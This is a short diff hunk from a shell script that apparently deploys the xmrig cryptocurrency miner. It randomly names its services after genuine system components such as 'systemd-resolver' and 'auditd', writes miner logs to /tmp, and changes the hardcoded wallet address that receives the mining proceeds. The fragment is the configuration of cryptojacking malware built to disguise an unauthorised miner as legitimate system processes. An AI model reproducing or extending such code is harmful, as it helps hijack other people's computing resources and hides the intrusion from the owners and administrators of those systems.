@@ -27,7 +27,7 @@ SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
 SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
 LOG1="/tmp/xmrig-log1.log"
 LOG2="/tmp/xmrig-log2.log"
-KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDz"
 
 
 
